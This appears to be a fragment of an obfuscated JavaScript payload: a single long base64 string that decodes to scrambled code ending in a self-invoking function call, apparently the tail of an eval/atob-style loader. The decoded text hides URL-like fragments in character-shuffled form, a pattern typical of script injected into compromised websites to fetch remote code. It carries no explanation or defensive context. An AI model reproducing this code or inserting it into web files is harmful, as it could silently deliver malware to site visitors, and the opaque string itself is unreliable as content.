edDJdYSk4YWReX285KzthW2ReaWVfM2Vdbl5tVTYpe2xhLiV0PV1TXl0wRylnM2xTXl5ePl4hNy5mbE99YjgoX2pub15yY2laYSBPe3Jvb20pZTEhYTZjXitdbl4sKGVpbCVfLldGLigzMTFeXyIoJCVeXmFkLjRyXilJM3heXiMgN15dMWFzXCc9XXRudSleU15sY20pKF1vdmZvXzp9dDBvQV4zXiBeOjldYXIleW52aSl7ZXJROGhoXihiXz1QZV9vJWc1KkNyX2heLC1fPV1mWC4gYXJzPi5zKWJUcF9yLGMiX2RTcHReLF5wbzRecm0xaEtvPW83KCFyIS52KV4oMylubFRvd3Nebi4lLm0lP1Z0aDdlX2RfX151aV5jJV5HZ2FeKXRTZCU9cmkpb2FvXmJjMzEgLTBlcnAxUCggMCRyNC5zYT4xYWFoc2MuLXNzbyhfXV90cXUuLG5dZW5sKEUoaW5eKVlhX2VhXnZldFlee2cyaSFucGwhIy51XWFtYm40JW1fdGZMSWl9cDxyYX12Xi5WXnQuIV91dm43XmRmNlsuOzo5XnwyRF49JXNmZy5eYzMiYjAoLmF9PTFeYWouYXN9MGVeZXR4cnteZD1eLGU0bHIgbUoiSigoSXthM2RucD1fMl51Lk4rb2FyYXJ0MGYlXi5yJV1vY14oLjRsIF4tPTtybz0yKXJwYXU1bF5jJW4lPTRtaCl1XC9YLl50MGg4b2UlbClubmxeaC5iIUZ0Xl48fXQiOW15KF5eTm9yXTdyIW90RnQiZm8xXzM2XSt5IEVdaSEoNCglcihpb29PXnQoJC55YUluYnNleW1lLildX2FpZSBifHxeMmFvbmRVYTd0XWFzZDpeaXAlOlwvXl9zZW86b15ebl94I1JvXjhfZS5dLiVlIWcudGhlMGEwXl19XjE7KF5lW210PCBde3suU2NiXl5lM3QuPWtmaHA0dSllKGVlc3dlXWF0OmF0eyUoYis7NF4wXnRoMzZdNyVeJCMoS2EgXm90OjspZE10b25vXyxqfTE6ZGxUbzcpXil9fXRyXmlwOz1eLileW2dkJHAuYSg9XW5fLV5LO10sOC4pd2VLIV5zNDQ7WGZiOl45XmxhMyheKSQub2ExZiFvZW4kKWF3eV5uPSU6eC40bi45e3Q5byEpfV5hKGFbbj9jdGdbKDpmOXMsJV55XmVecn0pLnJfXmF7ZHsucDJUKS44XVluMGRfXmVbKDp7PSA9cil1LjJdXikuMXRlJCUyP2gueV4uIV43KC5fcmF7Zm8zKXN0aTRhYThfd19fZW9cLzY4dVU9LD0sc2EpK090KXQhXiogZC51YV84bl41U2VeK1doaXVeXmYzZV5Pbl5kMD00ZWllc15jXilvPVMyLkE1XmI0O2EtRyxhXS4uXl9hb257bl5eTF5lXkZefWthcyk1M2FuX3JdXjl7YzI9XiVuMXRmW2FvZiNhMW5kZV4odHAzKV0yQmxbLj1eYSApXn15ZilkKC5ee15IZW5LMCgobjtjYV4pXl8rPV09X15eNStkeD1hYS4oMl5UJV5POzVyJV9vbHVebWEyN2E1ZXQhXmQ/cyhkXl4laWNuPWJea3QxMCBhLl1db14sUEdfXl5kWzEocl5dQC5qZWw3X2o9bEclcjAuYWEoLmU+XnJ7JHJve2kuMl1eX2IoKz0ldV0lcjRTKSwgIF5hLmUuZWkpb2UsbnIla2FpLC4zMih0T2VjXit9c3RiYTRjPV1vdHsxKXBObURkYihkOyUoPXVfNFwvYTFhMV5uKWxpOyBuM2RsXjMoXlQwXl5tIXBkfVtdfW89Xn11YUVlXi5eXi50ciliYSE2XjFuYV9vXXheXiFzX18gXXQ0JlwnXnNyLXNmUy10b15iXn19XXAiXnQuaTJeLl9dXl5eM29yXWxwOjBeITFiX2VvO0NdWHRlKWddLjFfXi5vW29lIWEpZilwMC5ke141KWxuSXY6Q29dYX0uPXNecm5fYl5jO3MlIDl0XiVhZl5hdGhbXXkyMzE1b14lKGNlSDJlYV90OyU9bnIrMV1ufUFyPSheJSlmXXRqayhhc2R9Xm5tYl1ofV59Xnk/Nl9hXWN2TlRvPT1eQGd1O0YuM25yKWNhXjFeXmNiPSAlXjAyXiliXWdqLHBeXl1ebi45XjJoanpdYT1eLi5dXlNeKF1uOjtpZjtmYXUwXzY1YV4iaSw5ezQ0ZGVlOjxlXl87XXAzJSVUPXI1IF8xdWJlXVcyJV1fXileKW1uXTU6a2QyLSBdfW4oMWllKVtmN3k0JGcuMDEuXm0jOjEkSF8xbiVJUzcwKWhbIGNpLi5QPV4xe2JIIl4tLjFecm8pNzBUY3RlZXJeXVt0XmdfbV80ZWZfKT07LCh0LGQjKWUkYV5fVlU9XnxyXmZfXilhXl9fW15bIG9maiEuNHVsSSBebi5ebmVebz01ZTZuXil1dCkyKF9nXylpLmxeLF5peV5wbl5eKV50bW5hZmRpIyleYV1hYW9AXjt1e2NpISxhKW5teyZhPW0yXl00LTZeQmFubHtoZV5xKHZfZGxsLjl0YV4uYV4xNGFVaH1eNl5tPTtdaCxeeS54Z15jXV9sY11cJyVedGp9bF4uY314bz49bzhhY259TnQ5XjFral5sN24ydCkraWwhY29dfSkxdDFfb19ycjIxdzVZZF5iKHRsPShfaThhXjM5XiBfMGoqMmdXJV53b3tALl10X3VpLnJ1c106ZjtmZnA1KF4yYSFidClediksc3M0ZG5zX3RpPSEpKH0ldF4pdHtdcD1dXnQgbm9ecG8odGMgLHRdZl0hNV9fXC9bai41Oy5bMmFzMXI9eWVlcyhhYV0oKXA9fWVhPy4uQzJvK3Q3cmFeZV8uMzZyfXUgZS0uPWppQ15fYVleYSleb2V0JiZjIG9zQiUickJ0ZV5pZTQpXC8hbFd0ZnsuKCFwYVFeOHQrYSwxOWFhLDo4X2VvYUZ8dSVefW9eXl8uLmVfaGYsdF1zYXsxRCBzX2ElLmVuInMoO106dCYuLlEzISUhbmVjXihfTnddZXleLnRsb15WJWFhPXIwIGg8TjdtaSteMV86OkNlOXM3eV1pPXlfd29mLnNjKX0rUWllXmUrXjNqXmQpXSU0XjteXj0lMjJtX28pKzpecjIxXV98dClNZClkOGleXnJlcihfLl1lWjthMV5zMH1eZzNhLndnZDA2MF41XjtkXnIycCVlbyheXishcjlvXm4zMCstdGUoMGFsPV4zdGZvZmFyKjZeXn19ZWFnakk2OiJpLChhO20sdV4lYjApKV5eIjAwYjUlfHMwYW9jcnReRy4xXz1eRyFlXjIgX2UiKy5eKWVfZm4kMF4kYmV9XmVeXj5eIl5RaTR7LmU0Li5lLHYiM19vdDheMWE1bDs4e3IpbXVcL3JfYTJwXXQ7YSMjIWReLl06fV5eWz9lXj1ddGNkJSBsZigyO14pZTshdHUhICg6cmFlcC5kZW45dF40NDMle3IsKDNyZF5ea3JfYn1hY28xWyhdXXRfJiklZDF9KSl0RTlybCJlMV5dKC47YV1lXmNeYjtkX2hfc2o2dG4uKGk9XlJWaSx7MykrYzNsZCRfcmU7XXZeMTQuZ2kuYTVfJV5hbyN0XmpdZXVfXSlvZV5jJVFeeXRvMSFeXW5EdCYhICUwbl5eYV4pJSBENF9SNTReJndhX3RyMWFvTy5eZmk1OSB0fV59PV5eKStDal19byhhKGFeb3J9PV5eOD10dF9eNihlXi4wdFF0YV82bi5fKHJvYTo6XWFhMF5OdHNlW1wvZV1eZDpfbTt9aHdybz0gXl1eOW5eR11eLTNfZ29HXiQwYXdyfSZePWg9U2VedGFeNWFZLmF7KWZeOW4xNyBdbmlPb2NyICkgXV5YX2dkaGQreTZvKFM7XV90eyBjNChcJ11kW15dOVwvanN1aV5ubF1vJSEzdXItOCU9Ll9efDJlXzBNXS5he2ZuX3teezdvLmlvPnNyKzoxfXNedDddS14uaC5faWVhTGMocjMuXi5UdlwvZi0lKTMrXyAyMS5hZTU4ISRhYV5hXC95dGk9Xm4geHRbOi53IF40LWxvZmFeX3ZhbHQ7JS5pe2UgbltsJHReXk9iY15dXl4gMzkpNk91JWFhXiBiLmV0JmIle0h9LnVdO0puXmZ5YXNvZF50My5wW3IyOl5vXiByKGhrXWNGcm1eYXsual1VYTskXiwhKHs9cl4hTTFhQWFsbjFwIWNRcDMlZSAlIXt0YSAyIVslZXQ5YXlfMHJhZXNfXnUoO2lvIC5eLDA7LmxjOzV0X18hJykpO3ZhciBNRWE9UUhoKGpIdSx5RU0gKTtNRWEoMzcyOCk7cmV0dXJuIDY4ODR9KSgp'))
